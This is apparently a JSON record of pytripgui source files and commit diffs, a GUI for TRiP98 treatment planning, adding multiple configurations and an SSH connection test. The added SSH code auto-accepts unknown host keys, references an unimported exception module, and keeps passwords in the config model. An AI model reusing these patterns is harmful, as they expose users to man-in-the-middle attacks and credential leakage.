on_trip98_config(self): \"\"\" Config menu opened from window->Settings->TRiP98 Config \"\"\" logger.debug(\"TRiP config menu()\") from pytripgui.config_vc import ConfigController view=self.parent_gui.get_trip_config_view() controller=ConfigController(self.app_model.trip_config, view) controller.set_view_from_model() view.show() if controller.user_clicked_save: self.settings.save() def on_add_patient(self): dialog=UiAddPatient(self.parent_gui.ui) dialog.on_create_empty=self.add_empty_patient dialog.on_open_voxelplan=self.on_open_voxelplan dialog.on_open_dicom=self.on_open_dicom dialog.show() def add_empty_patient(self): patient=PatientItem() self.app_model.patient_tree.add_new_item(None, patient) def on_create_field(self): field=FieldItem() save_field=self.edit_field(field) if save_field: selected_item=self.app_model.patient_tree.selected_item() if isinstance(selected_item, PlanItem): selected_plan=selected_item elif isinstance(selected_item, FieldItem): selected_plan=selected_item.parent self.app_model.patient_tree.add_new_item(selected_plan, field) def new_item_callback(self, parent): if parent is None: self.add_empty_patient() elif isinstance(parent, PatientItem): plan=self.edit_plan(PlanItem(), parent) self.app_model.patient_tree.add_new_item(parent, plan) elif isinstance(parent, PlanItem): field=self.edit_field(FieldItem()) self.app_model.patient_tree.add_new_item(parent, field) def edit_item_callback(self, item, patient): if isinstance(item, PatientItem): return elif isinstance(item, PlanItem): self.edit_plan(item, patient) elif isinstance(item, FieldItem): self.edit_field(item) def edit_plan(self, item, patient): logger.debug(\"edit_plan()\".format()) if not patient.data.vdx: self.parent_gui.show_info(*InfoMessages[\"loadCtxVdx\"]) return False item.data.basename=patient.data.name view=PlanQtView(self.parent_gui.ui) controller=PlanController(item.data, view, self.app_model.kernels, patient.data.vdx.vois) controller.set_view_from_model() view.show() if controller.user_clicked_save: return item return None def edit_field(self, item): logger.debug(\"edit_field()\".format()) view=FieldQtView(self.parent_gui.ui) item.data.basename=\"field\" controller=FieldController(item.data, view, self.app_model.kernels) controller.set_view_from_model() view.show() if controller.user_clicked_save: return item return None def open_voxelplan_callback(self, patient_item): path=self.parent_gui.browse_file_path(\"Open Voxelpan\", \"Voxelplan(*.hed)\") filename, extension=os.path.splitext(path) if filename==\"\": return False patient=patient_item.data patient.open_ctx(filename +\".ctx\") patient.open_vdx(filename +\".vdx\") if not self.app_model.viewcanvases: self.app_model.viewcanvases=ViewCanvases() self.parent_gui.add_widget(self.app_model.viewcanvases.widget()) self.app_model.viewcanvases.set_patient(patient) return True def open_dicom_callback(self, patient_item): dir_name=self.parent_gui.browse_folder_path(\"Open DICOM folder\") if not dir_name: return False patient=patient_item.data patient.open_dicom(dir_name) if not self.app_model.viewcanvases: self.app_model.viewcanvases=ViewCanvases() self.parent_gui.add_widget(self.app_model.viewcanvases.widget()) self.app_model.viewcanvases.set_patient(patient) return True def one_click_callback(self): self.parent_gui.action_create_field_set_enable(False) self.parent_gui.action_create_plan_set_enable(False) self.parent_gui.action_execute_plan_set_enable(False) item=self.app_model.patient_tree.selected_item() top_item=self.app_model.patient_tree.selected_item_patient() if isinstance(top_item, SimulationResultItem): self.app_model.viewcanvases.set_simulation_results(top_item.data) self.chart.set_simulation_result(top_item.data) elif isinstance(top_item, PatientItem): self.parent_gui.action_create_plan_set_enable(True) if self.app_model.viewcanvases: self.app_model.viewcanvases.set_patient(top_item.data) if isinstance(item, PlanItem): self.parent_gui.action_create_field_set_enable(True) if self.is_executable(item): self.parent_gui.action_execute_plan_set_enable(True) elif isinstance(item, FieldItem): self.parent_gui.action_create_field_set_enable(True) if self.is_executable(item): self.parent_gui.action_execute_plan_set_enable(True) @staticmethod def is_executable(item): if isinstance(item, PlanItem): if item.has_children(): return True elif isinstance(item, FieldItem): return True return False ","sourceWithComments":"from pytripgui.plan_vc.plan_view import PlanQtView\nfrom pytripgui.plan_vc.plan_cont import PlanController\nfrom pytripgui.field_vc.field_view import FieldQtView\nfrom pytripgui.field_vc.field_cont import FieldController\nfrom pytripgui.app_logic.viewcanvas import ViewCanvases\n\nfrom pytripgui.tree_vc.TreeItems import PatientItem, PlanItem, FieldItem\nfrom pytripgui.tree_vc.TreeItems import SimulationResultItem\n\nfrom pytripgui.messages import InfoMessages\nfrom pytripgui.app_logic.charts import Charts\n\nfrom pytripgui.app_logic.gui_executor import GuiExecutor\n\nfrom pytripgui.view.qt_gui import UiAddPatient\n\nfrom pytripgui.controller.settings_cont import SettingsController\n\nimport os\nimport logging\nlogger = logging.getLogger(__name__)\n\n\nclass AppCallback:\n    def __init__(self, app_model, parent_gui):\n        self.app_model = app_model\n        self.parent_gui = parent_gui\n        self.chart = Charts(self.parent_gui)\n\n        self.settings = SettingsController(self.app_model)\n\n    def on_open_voxelplan(self):\n        patient = PatientItem()\n        if self.open_voxelplan_callback(patient):\n            self.app_model.patient_tree.add_new_item(None, patient)\n\n    def on_open_dicom(self):\n        patient = PatientItem()\n        if self.open_dicom_callback(patient):\n            self.app_model.patient_tree.add_new_item(None, patient)\n\n    def on_execute_selected_plan(self):\n        item = self.app_model.patient_tree.selected_item()\n        if isinstance(item, FieldItem):\n            plan = item.parent\n        else:\n            plan = item\n\n        if not isinstance(plan, PlanItem):\n            raise TypeError(\"You should select Field or Plan\")\n\n        patient = self.app_model.patient_tree.selected_item_patient()\n\n        executor = GuiExecutor(self.app_model.trip_config, patient, plan,\n                               self._execute_finish_callback,\n                               self.parent_gui.ui)\n\n        executor.start()\n        executor.show()\n\n    def _execute_finish_callback(self, item):\n        self.app_model.patient_tree.add_new_item(None, item)\n\n    def on_add_new_plan(self):\n        selected_patient = self.app_model.patient_tree.selected_item_patient()\n        if not selected_patient:\n            self.parent_gui.show_info(*InfoMessages[\"addNewPatient\"])\n            return\n        self.new_item_callback(selected_patient)\n\n    def on_kernels_configurator(self):\n        \"\"\"\n        Kernel dialog opened from window->settings->kernel\n        \"\"\"\n        from pytripgui.kernel_vc import KernelController\n\n        model = self.app_model.kernels\n        view = self.parent_gui.get_kernel_config_view()\n\n        controller = KernelController(model, view)\n        controller.set_view_from_model()\n        view.show()\n\n        if controller.user_clicked_save:\n            self.settings.save()\n\n    def on_trip98_config(self):\n        \"\"\"\n        Config menu opened from window->Settings->TRiP98 Config\n        \"\"\"\n        logger.debug(\"TRiP config menu()\")\n\n        from pytripgui.config_vc import ConfigController\n\n        view = self.parent_gui.get_trip_config_view()\n\n        controller = ConfigController(self.app_model.trip_config, view)\n        controller.set_view_from_model()\n        view.show()\n\n        if controller.user_clicked_save:\n            self.settings.save()\n\n    def on_add_patient(self):\n        dialog = UiAddPatient(self.parent_gui.ui)\n        dialog.on_create_empty = self.add_empty_patient\n        dialog.on_open_voxelplan = self.on_open_voxelplan\n        dialog.on_open_dicom = self.on_open_dicom\n        dialog.show()\n\n    def add_empty_patient(self):\n        patient = PatientItem()\n        self.app_model.patient_tree.add_new_item(None, patient)\n\n    def on_create_field(self):\n        field = FieldItem()\n        save_field = self.edit_field(field)\n        if save_field:\n            selected_item = self.app_model.patient_tree.selected_item()\n            if isinstance(selected_item, PlanItem):\n                selected_plan = selected_item\n            elif isinstance(selected_item, FieldItem):\n                selected_plan = selected_item.parent\n            self.app_model.patient_tree.add_new_item(selected_plan, field)\n\n    def new_item_callback(self, parent):\n        if parent is None:\n            self.add_empty_patient()\n        elif isinstance(parent, PatientItem):\n            plan = self.edit_plan(PlanItem(), parent)\n            self.app_model.patient_tree.add_new_item(parent, plan)\n        elif isinstance(parent, PlanItem):\n            field = self.edit_field(FieldItem())\n            self.app_model.patient_tree.add_new_item(parent, field)\n\n    def edit_item_callback(self, item, patient):\n        if isinstance(item, PatientItem):\n            return\n        elif isinstance(item, PlanItem):\n            self.edit_plan(item, patient)\n        elif isinstance(item, FieldItem):\n            self.edit_field(item)\n\n    def edit_plan(self, item, patient):\n        logger.debug(\"edit_plan()\".format())\n\n        if not patient.data.vdx:\n            self.parent_gui.show_info(*InfoMessages[\"loadCtxVdx\"])\n            return False\n\n        item.data.basename = patient.data.name\n\n        view = PlanQtView(self.parent_gui.ui)\n\n        controller = PlanController(item.data, view, self.app_model.kernels,\n                                    patient.data.vdx.vois)\n        controller.set_view_from_model()\n        view.show()\n\n        if controller.user_clicked_save:\n            return item\n        return None\n\n    def edit_field(self, item):\n        logger.debug(\"edit_field()\".format())\n\n        view = FieldQtView(self.parent_gui.ui)\n\n        item.data.basename = \"field\"\n        controller = FieldController(item.data, view, self.app_model.kernels)\n        controller.set_view_from_model()\n        view.show()\n\n        if controller.user_clicked_save:\n            return item\n        return None\n\n    def open_voxelplan_callback(self, patient_item):\n        path = self.parent_gui.browse_file_path(\"Open Voxelpan\",\n                                                \"Voxelplan (*.hed)\")\n        filename, extension = os.path.splitext(path)\n\n        if filename == \"\":\n            return False\n\n        patient = patient_item.data\n        patient.open_ctx(filename + \".ctx\")  # Todo catch exceptions\n        patient.open_vdx(filename + \".vdx\")  # Todo catch exceptions\n\n        if not self.app_model.viewcanvases:\n            self.app_model.viewcanvases = ViewCanvases()\n            self.parent_gui.add_widget(self.app_model.viewcanvases.widget())\n\n        self.app_model.viewcanvases.set_patient(patient)\n        return True\n\n    def open_dicom_callback(self, patient_item):\n        dir_name = self.parent_gui.browse_folder_path(\"Open DICOM folder\")\n\n        if not dir_name:\n            return False\n\n        patient = patient_item.data\n        patient.open_dicom(dir_name)  # Todo catch exceptions\n\n        if not self.app_model.viewcanvases:\n            self.app_model.viewcanvases = ViewCanvases()\n            self.parent_gui.add_widget(self.app_model.viewcanvases.widget())\n\n        self.app_model.viewcanvases.set_patient(patient)\n        return True\n\n    def one_click_callback(self):\n        self.parent_gui.action_create_field_set_enable(False)\n        self.parent_gui.action_create_plan_set_enable(False)\n        self.parent_gui.action_execute_plan_set_enable(False)\n\n        item = self.app_model.patient_tree.selected_item()\n        top_item = self.app_model.patient_tree.selected_item_patient()\n\n        if isinstance(top_item, SimulationResultItem):\n            self.app_model.viewcanvases.set_simulation_results(top_item.data)\n            self.chart.set_simulation_result(top_item.data)\n        elif isinstance(top_item, PatientItem):\n            self.parent_gui.action_create_plan_set_enable(True)\n            if self.app_model.viewcanvases:\n                self.app_model.viewcanvases.set_patient(top_item.data)\n\n        if isinstance(item, PlanItem):\n            self.parent_gui.action_create_field_set_enable(True)\n            if self.is_executable(item):\n                self.parent_gui.action_execute_plan_set_enable(True)\n\n        elif isinstance(item, FieldItem):\n            self.parent_gui.action_create_field_set_enable(True)\n            if self.is_executable(item):\n                self.parent_gui.action_execute_plan_set_enable(True)\n\n    @staticmethod\n    def is_executable(item):\n        if isinstance(item, PlanItem):\n            if item.has_children():\n                return True\n        elif isinstance(item, FieldItem):\n            return True\n\n        return False\n"},"\/pytripgui\/config_vc\/config_cont.py":{"changes":[{"diff":"\n         self.model = model\n         self.view = view\n         self.user_clicked_save = False\n-        self._setup_ok_and_cancel_buttons_callbacks()\n+        self._setup_callbacks()\n+\n+        self.view.test_ssh_clicked_callback_connect(self._test_ssh)\n \n-    def _setup_ok_and_cancel_buttons_callbacks(self):\n+        if not self.model:\n+            self.model = [Trip98ConfigModel()]\n+\n+    def _setup_callbacks(self):\n         self.view.set_ok_callback(self._save_and_exit)\n         self.view.set_cancel_callback(self._exit)\n \n+        self.view.add_button.emit_on_click(\n+            lambda: self.view.configs.append_element(Trip98ConfigModel(), \"\"))\n+        self.view.remove_button.emit_on_click(\n+            self.view.configs.remove_current_item)\n+\n     def _save_and_exit(self):\n-        self.set_model_from_view()\n         self.user_clicked_save = True\n-        self.view.exit()\n+        self.model = self.view.configs.data\n+        self._exit()\n \n     def _exit(self):\n+        if self.view.configs.count:\n+            self._set_model_from_view()\n         self.view.exit()\n \n     def set_view_from_model(self):\n-        self.view.wdir_path = self.model.wdir_path\n-        self.view.trip_path = self.model.trip_path\n-        self.view.hlut_path = self.model.hlut_path\n-        self.view.dedx_path = self.model.dedx_path\n-\n-    def set_model_from_view(self):\n-        self.model.wdir_path = self.view.wdir_path\n-        self.model.trip_path = self.view.trip_path\n-        self.model.hlut_path = self.view.hlut_path\n-        self.model.dedx_path = self.view.dedx_path\n+        self.view.configs.fill(self.model, lambda item: item.name)\n+        self.view.configs.emit_on_item_change(self._on_item_change_callback)\n+        self._set_current_config()\n+\n+    def _on_item_change_callback(self):\n+        self._set_model_from_view()\n+        self._set_current_config()\n+\n+    def _set_current_config(self):\n+        config = self.view.configs.current_data\n+\n+        self.view.remote_execution = config.remote_execution\n+        self.view.name.text = config.name\n+        self.view.wdir_path.text = config.wdir_path\n+        self.view.trip_path.text = config.trip_path\n+        self.view.hlut_path.text = config.hlut_path\n+        self.view.dedx_path.text = config.dedx_path\n+        self.view.host_name.text = config.host_name\n+        self.view.user_name.text = config.user_name\n+        self.view.pkey_path.text = config.pkey_path\n+        self.view.password.text = config.password\n+        self.view.wdir_remote_path.text = config.wdir_remote_path\n+\n+    def _set_model_from_view(self):\n+        config = self.view.configs.last_data\n+\n+        # after you delete config, there is nothing in last_data\n+        if not config:\n+            return\n+\n+        config.remote_execution = self.view.remote_execution\n+        config.name = self.view.name.text\n+        config.wdir_path = self.view.wdir_path.text\n+        config.trip_path = self.view.trip_path.text\n+        config.hlut_path = self.view.hlut_path.text\n+        config.dedx_path = self.view.dedx_path.text\n+        config.host_name = self.view.host_name.text\n+        config.user_name = self.view.user_name.text\n+        config.pkey_path = self.view.pkey_path.text\n+        config.password = self.view.password.text\n+        config.wdir_remote_path = self.view.wdir_remote_path.text\n+\n+    def _test_ssh(self):\n+        import paramiko\n+        ssh = paramiko.SSHClient()\n+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n+\n+        key_path = None\n+        if self.view.pkey_path.text:\n+            key_path = self.view.pkey_path.text\n+\n+        try:\n+            ssh.connect(hostname=self.view.host_name.text,\n+                        username=self.view.user_name.text,\n+                        password=self.view.password.text,\n+                        key_filename=key_path)\n+        except ssh_exception.AuthenticationException as e:\n+            self.view.info_box.show_error(\"Authentication\", e.__str__())\n+        except FileNotFoundError as e:\n+            self.view.info_box.show_error(\"File not found\", e.__str__())\n+        except ValueError as e:\n+            self.view.info_box.show_error(\"Value\", e.__str__())\n+        else:\n+\n+            sftp = ssh.open_sftp()\n+            try:\n+                sftp.stat(self.view.wdir_remote_path.text)\n+            except FileNotFoundError as e:\n+                self.view.info_box.show_error(\n+                    \"File not found\", \"Remote working directory doesn't exist\")\n+            else:\n+                self.view.info_box.show_info(\"SSH Connection\", \"Everything OK\")\n+\n+        ssh.close(","add":90,"remove":14,"filename":"\/pytripgui\/config_vc\/config_cont.py","badparts":["        self._setup_ok_and_cancel_buttons_callbacks()","    def _setup_ok_and_cancel_buttons_callbacks(self):","        self.set_model_from_view()","        self.view.exit()","        self.view.wdir_path = self.model.wdir_path","        self.view.trip_path = self.model.trip_path","        self.view.hlut_path = self.model.hlut_path","        self.view.dedx_path = self.model.dedx_path","    def set_model_from_view(self):","        self.model.wdir_path = self.view.wdir_path","        self.model.trip_path = self.view.trip_path","        self.model.hlut_path = self.view.hlut_path","        self.model.dedx_path = self.view.dedx_path"],"goodparts":["        self._setup_callbacks()","        self.view.test_ssh_clicked_callback_connect(self._test_ssh)","        if not self.model:","            self.model = [Trip98ConfigModel()]","    def _setup_callbacks(self):","        self.view.add_button.emit_on_click(","            lambda: self.view.configs.append_element(Trip98ConfigModel(), \"\"))","        self.view.remove_button.emit_on_click(","            self.view.configs.remove_current_item)","        self.model = self.view.configs.data","        self._exit()","        if self.view.configs.count:","            self._set_model_from_view()","        self.view.configs.fill(self.model, lambda item: item.name)","        self.view.configs.emit_on_item_change(self._on_item_change_callback)","        self._set_current_config()","    def _on_item_change_callback(self):","        self._set_model_from_view()","        self._set_current_config()","    def _set_current_config(self):","        config = self.view.configs.current_data","        self.view.remote_execution = config.remote_execution","        self.view.name.text = config.name","        self.view.wdir_path.text = config.wdir_path","        self.view.trip_path.text = config.trip_path","        self.view.hlut_path.text = config.hlut_path","        self.view.dedx_path.text = config.dedx_path","        self.view.host_name.text = config.host_name","        self.view.user_name.text = config.user_name","        self.view.pkey_path.text = config.pkey_path","        self.view.password.text = config.password","        self.view.wdir_remote_path.text = config.wdir_remote_path","    def _set_model_from_view(self):","        config = self.view.configs.last_data","        if not config:","            return","        config.remote_execution = self.view.remote_execution","        config.name = self.view.name.text","        config.wdir_path = self.view.wdir_path.text","        config.trip_path = self.view.trip_path.text","        config.hlut_path = self.view.hlut_path.text","        config.dedx_path = self.view.dedx_path.text","        config.host_name = self.view.host_name.text","        config.user_name = self.view.user_name.text","        config.pkey_path = self.view.pkey_path.text","        config.password = self.view.password.text","        config.wdir_remote_path = self.view.wdir_remote_path.text","    def _test_ssh(self):","        import paramiko","        ssh = paramiko.SSHClient()","        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())","        key_path = None","        if self.view.pkey_path.text:","            key_path = self.view.pkey_path.text","        try:","            ssh.connect(hostname=self.view.host_name.text,","                        username=self.view.user_name.text,","                        password=self.view.password.text,","                        key_filename=key_path)","        except ssh_exception.AuthenticationException as e:","            self.view.info_box.show_error(\"Authentication\", e.__str__())","        except FileNotFoundError as e:","            self.view.info_box.show_error(\"File not found\", e.__str__())","        except ValueError as e:","            self.view.info_box.show_error(\"Value\", e.__str__())","        else:","            sftp = ssh.open_sftp()","            try:","                sftp.stat(self.view.wdir_remote_path.text)","            except FileNotFoundError as e:","                self.view.info_box.show_error(","                    \"File not found\", \"Remote working directory doesn't exist\")","            else:","                self.view.info_box.show_info(\"SSH Connection\", \"Everything OK\")","        ssh.close("]},{"diff":"\n         self.model = model\n         self.view = view\n         self.user_clicked_save = False\n-        self._setup_ok_and_cancel_buttons_callbacks()\n+        self._setup_callbacks()\n+\n+        self.view.test_ssh_clicked_callback_connect(self._test_ssh)\n \n-    def _setup_ok_and_cancel_buttons_callbacks(self):\n+        if not self.model:\n+            self.model = [Trip98ConfigModel()]\n+\n+    def _setup_callbacks(self):\n         self.view.set_ok_callback(self._save_and_exit)\n         self.view.set_cancel_callback(self._exit)\n \n+        self.view.add_button.emit_on_click(\n+            lambda: self.view.configs.append_element(Trip98ConfigModel(), \"\"))\n+        self.view.remove_button.emit_on_click(\n+            self.view.configs.remove_current_item)\n+\n     def _save_and_exit(self):\n-        self.set_model_from_view()\n         self.user_clicked_save = True\n-        self.view.exit()\n+        self.model = self.view.configs.data\n+        self._exit()\n \n     def _exit(self):\n+        if self.view.configs.count:\n+            self._set_model_from_view()\n         self.view.exit()\n \n     def set_view_from_model(self):\n-        self.view.wdir_path = self.model.wdir_path\n-        self.view.trip_path = self.model.trip_path\n-        self.view.hlut_path = self.model.hlut_path\n-        self.view.dedx_path = self.model.dedx_path\n-\n-    def set_model_from_view(self):\n-        self.model.wdir_path = self.view.wdir_path\n-        self.model.trip_path = self.view.trip_path\n-        self.model.hlut_path = self.view.hlut_path\n-        self.model.dedx_path = self.view.dedx_path\n+        self.view.configs.fill(self.model, lambda item: item.name)\n+        self.view.configs.emit_on_item_change(self._on_item_change_callback)\n+        self._set_current_config()\n+\n+    def _on_item_change_callback(self):\n+        self._set_model_from_view()\n+        self._set_current_config()\n+\n+    def _set_current_config(self):\n+        config = self.view.configs.current_data\n+\n+        self.view.remote_execution = config.remote_execution\n+        self.view.name.text = config.name\n+        self.view.wdir_path.text = config.wdir_path\n+        self.view.trip_path.text = config.trip_path\n+        self.view.hlut_path.text = config.hlut_path\n+        self.view.dedx_path.text = config.dedx_path\n+        self.view.host_name.text = config.host_name\n+        self.view.user_name.text = config.user_name\n+        self.view.pkey_path.text = config.pkey_path\n+        self.view.password.text = config.password\n+        self.view.wdir_remote_path.text = config.wdir_remote_path\n+\n+    def _set_model_from_view(self):\n+        config = self.view.configs.last_data\n+\n+        # after you delete config, there is nothing in last_data\n+        if not config:\n+            return\n+\n+        config.remote_execution = self.view.remote_execution\n+        config.name = self.view.name.text\n+        config.wdir_path = self.view.wdir_path.text\n+        config.trip_path = self.view.trip_path.text\n+        config.hlut_path = self.view.hlut_path.text\n+        config.dedx_path = self.view.dedx_path.text\n+        config.host_name = self.view.host_name.text\n+        config.user_name = self.view.user_name.text\n+        config.pkey_path = self.view.pkey_path.text\n+        config.password = self.view.password.text\n+        config.wdir_remote_path = self.view.wdir_remote_path.text\n+\n+    def _test_ssh(self):\n+        import paramiko\n+        ssh = paramiko.SSHClient()\n+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n+\n+        key_path = None\n+        if self.view.pkey_path.text:\n+            key_path = self.view.pkey_path.text\n+\n+        try:\n+            ssh.connect(hostname=self.view.host_name.text,\n+                        username=self.view.user_name.text,\n+                        password=self.view.password.text,\n+                        key_filename=key_path)\n+        except ssh_exception.AuthenticationException as e:\n+            self.view.info_box.show_error(\"Authentication\", e.__str__())\n+        except FileNotFoundError as e:\n+            self.view.info_box.show_error(\"File not found\", e.__str__())\n+        except ValueError as e:\n+            self.view.info_box.show_error(\"Value\", e.__str__())\n+        else:\n+\n+            sftp = ssh.open_sftp()\n+            try:\n+                sftp.stat(self.view.wdir_remote_path.text)\n+            except FileNotFoundError as e:\n+                self.view.info_box.show_error(\n+                    \"File not found\", \"Remote working directory doesn't exist\")\n+            else:\n+                self.view.info_box.show_info(\"SSH Connection\", \"Everything OK\")\n+\n+        ssh.close(","add":90,"remove":14,"filename":"\/pytripgui\/config_vc\/config_cont.py","badparts":["        self._setup_ok_and_cancel_buttons_callbacks()","    def _setup_ok_and_cancel_buttons_callbacks(self):","        self.set_model_from_view()","        self.view.exit()","        self.view.wdir_path = self.model.wdir_path","        self.view.trip_path = self.model.trip_path","        self.view.hlut_path = self.model.hlut_path","        self.view.dedx_path = self.model.dedx_path","    def set_model_from_view(self):","        self.model.wdir_path = self.view.wdir_path","        self.model.trip_path = self.view.trip_path","        self.model.hlut_path = self.view.hlut_path","        self.model.dedx_path = self.view.dedx_path"],"goodparts":["        self._setup_callbacks()","        self.view.test_ssh_clicked_callback_connect(self._test_ssh)","        if not self.model:","            self.model = [Trip98ConfigModel()]","    def _setup_callbacks(self):","        self.view.add_button.emit_on_click(","            lambda: self.view.configs.append_element(Trip98ConfigModel(), \"\"))","        self.view.remove_button.emit_on_click(","            self.view.configs.remove_current_item)","        self.model = self.view.configs.data","        self._exit()","        if self.view.configs.count:","            self._set_model_from_view()","        self.view.configs.fill(self.model, lambda item: item.name)","        self.view.configs.emit_on_item_change(self._on_item_change_callback)","        self._set_current_config()","    def _on_item_change_callback(self):","        self._set_model_from_view()","        self._set_current_config()","    def _set_current_config(self):","        config = self.view.configs.current_data","        self.view.remote_execution = config.remote_execution","        self.view.name.text = config.name","        self.view.wdir_path.text = config.wdir_path","        self.view.trip_path.text = config.trip_path","        self.view.hlut_path.text = config.hlut_path","        self.view.dedx_path.text = config.dedx_path","        self.view.host_name.text = config.host_name","        self.view.user_name.text = config.user_name","        self.view.pkey_path.text = config.pkey_path","        self.view.password.text = config.password","        self.view.wdir_remote_path.text = config.wdir_remote_path","    def _set_model_from_view(self):","        config = self.view.configs.last_data","        if not config:","            return","        config.remote_execution = self.view.remote_execution","        config.name = self.view.name.text","        config.wdir_path = self.view.wdir_path.text","        config.trip_path = self.view.trip_path.text","        config.hlut_path = self.view.hlut_path.text","        config.dedx_path = self.view.dedx_path.text","        config.host_name = self.view.host_name.text","        config.user_name = self.view.user_name.text","        config.pkey_path = self.view.pkey_path.text","        config.password = self.view.password.text","        config.wdir_remote_path = self.view.wdir_remote_path.text","    def _test_ssh(self):","        import paramiko","        ssh = paramiko.SSHClient()","        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())","        key_path = None","        if self.view.pkey_path.text:","            key_path = self.view.pkey_path.text","        try:","            ssh.connect(hostname=self.view.host_name.text,","                        username=self.view.user_name.text,","                        password=self.view.password.text,","                        key_filename=key_path)","        except ssh_exception.AuthenticationException as e:","            self.view.info_box.show_error(\"Authentication\", e.__str__())","        except FileNotFoundError as e:","            self.view.info_box.show_error(\"File not found\", e.__str__())","        except ValueError as e:","            self.view.info_box.show_error(\"Value\", e.__str__())","        else:","            sftp = ssh.open_sftp()","            try:","                sftp.stat(self.view.wdir_remote_path.text)","            except FileNotFoundError as e:","                self.view.info_box.show_error(","                    \"File not found\", \"Remote working directory doesn't exist\")","            else:","                self.view.info_box.show_info(\"SSH Connection\", \"Everything OK\")","        ssh.close("]}],"source":"\nimport logging logger=logging.getLogger(__name__) class ConfigController(object): def __init__(self, model, view): self.model=model self.view=view self.user_clicked_save=False self._setup_ok_and_cancel_buttons_callbacks() def _setup_ok_and_cancel_buttons_callbacks(self): self.view.set_ok_callback(self._save_and_exit) self.view.set_cancel_callback(self._exit) def _save_and_exit(self): self.set_model_from_view() self.user_clicked_save=True self.view.exit() def _exit(self): self.view.exit() def set_view_from_model(self): self.view.wdir_path=self.model.wdir_path self.view.trip_path=self.model.trip_path self.view.hlut_path=self.model.hlut_path self.view.dedx_path=self.model.dedx_path def set_model_from_view(self): self.model.wdir_path=self.view.wdir_path self.model.trip_path=self.view.trip_path self.model.hlut_path=self.view.hlut_path self.model.dedx_path=self.view.dedx_path ","sourceWithComments":"import logging\nlogger = logging.getLogger(__name__)\n\n\nclass ConfigController(object):\n    def __init__(self, model, view):\n        self.model = model\n        self.view = view\n        self.user_clicked_save = False\n        self._setup_ok_and_cancel_buttons_callbacks()\n\n    def _setup_ok_and_cancel_buttons_callbacks(self):\n        self.view.set_ok_callback(self._save_and_exit)\n        self.view.set_cancel_callback(self._exit)\n\n    def _save_and_exit(self):\n        self.set_model_from_view()\n        self.user_clicked_save = True\n        self.view.exit()\n\n    def _exit(self):\n        self.view.exit()\n\n    def set_view_from_model(self):\n        self.view.wdir_path = self.model.wdir_path\n        self.view.trip_path = self.model.trip_path\n        self.view.hlut_path = self.model.hlut_path\n        self.view.dedx_path = self.model.dedx_path\n\n    def set_model_from_view(self):\n        self.model.wdir_path = self.view.wdir_path\n        self.model.trip_path = self.view.trip_path\n        self.model.hlut_path = self.view.hlut_path\n        self.model.dedx_path = self.view.dedx_path\n"},"\/pytripgui\/config_vc\/config_view.py":{"changes":[{"diff":"\n+from pytripgui.view.qt_view_adapter import LineEdit, ComboBox, UserInfoBox, PushButton\n from pytripgui.view.qt_gui import UiTripConfig\n from PyQt5.QtWidgets import QFileDialog\n \n import logging\n+\n logger = logging.getLogger(__name__)\n \n \n class ConfigQtView(object):\n+    stackedWidget_local_index = 0\n+    stackedWidget_remote_index = 1\n     \"\"\"\n     \"\"\"\n     def __init__(self):\n-        self.ui = UiTripConfig()\n+        self._ui = UiTripConfig()\n+\n+        self.name = LineEdit(self._ui.configName_lineEdit)\n+        self.user_name = LineEdit(self._ui.username_lineEdit)\n+        self.pkey_path = LineEdit(self._ui.pkey_lineEdit)\n+        self.password = LineEdit(self._ui.password_lineEdit)\n+        self.host_name = LineEdit(self._ui.host_lineEdit)\n+        self.dedx_path = LineEdit(self._ui.dedx_lineEdit)\n+        self.hlut_path = LineEdit(self._ui.hlut_lineEdit)\n+        self.wdir_path = LineEdit(self._ui.wdirPath_lineEdit)\n+        self.trip_path = LineEdit(self._ui.tripPath_lineEdit)\n+\n+        self.add_button = PushButton(self._ui.add_pushButton)\n+        self.remove_button = PushButton(self._ui.remove_pushButton)\n+\n+        self.wdir_remote_path = LineEdit(self._ui.wdirRemote_lineEdit)\n+\n+        self.configs = ComboBox(self._ui.configs_comboBox)\n+\n+        self.info_box = UserInfoBox(self._ui)\n \n         self._setup_internal_callbacks()\n-        self._disable_unimplemented()\n+        self._ui.local_radioButton.clicked.emit()\n+\n+        self.name.emit_on_text_change(\n+            lambda text: self.configs.set_current_item_text(text))\n+\n+    def test_ssh_clicked_callback_connect(self, callback):\n+        self._ui.testSsh_pushButton.clicked.connect(callback)\n \n     def _setup_internal_callbacks(self):\n-        self.ui.wdirPath_pushButton.clicked.connect(self._browse_wdir)\n-        self.ui.tripPath_pushButton.clicked.connect(self._browse_trip_path)\n-        self.ui.hlut_pushButton.clicked.connect(self._browse_hlut_path)\n-        self.ui.dedx_pushButton.clicked.connect(self._browse_dedx_path)\n+        self._ui.wdirPath_pushButton.clicked.connect(self._browse_wdir)\n+        self._ui.tripPath_pushButton.clicked.connect(self._browse_trip_path)\n+        self._ui.hlut_pushButton.clicked.connect(self._browse_hlut_path)\n+        self._ui.dedx_pushButton.clicked.connect(self._browse_dedx_path)\n+        self._ui.pKey_pushButton.clicked.connect(self._browse_pkey_path)\n+\n+        self._ui.local_radioButton.clicked.connect(\n+            self._on_local_radio_button_click)\n+        self._ui.remote_radioButton.clicked.connect(\n+            self._on_remote_radio_button_click)\n \n     def _browse_wdir(self):\n         selected_dir = QFileDialog.getExistingDirectory(\n-            self.ui,\n-            \"Select working directory\",\n-            self.wdir_path,\n+            self._ui, \"Select working directory\", self.wdir_path.text,\n             QFileDialog.ShowDirsOnly | QFileDialog.DontResolveSymlinks)\n         if selected_dir != \"\":\n-            self.wdir_path = selected_dir\n+            self.wdir_path.text = selected_dir\n \n     def _browse_trip_path(self):\n         selected_dir = QFileDialog.getExistingDirectory(\n-            self.ui,\n-            \"Select trip executable directory\",\n-            self.trip_path,\n+            self._ui, \"Select trip executable directory\", self.trip_path.text,\n             QFileDialog.ShowDirsOnly | QFileDialog.DontResolveSymlinks)\n         if selected_dir != \"\":\n-            self.trip_path = selected_dir\n+            self.trip_path.text = selected_dir\n \n     def _browse_hlut_path(self):\n         selected_file = QFileDialog.getOpenFileName(\n-            self.ui,\n-            \"Select HLUT\",\n-            self.hlut_path,\n+            self._ui, \"Select HLUT\", self.hlut_path.text,\n             \"Hounsfield lookup table (*.hlut)\")\n         if selected_file[0] != \"\":\n-            self.hlut_path = selected_file[0]\n+            self.hlut_path.text = selected_file[0]\n \n     def _browse_dedx_path(self):\n         selected_file = QFileDialog.getOpenFileName(\n-            self.ui,\n-            \"Select DEDX\",\n-            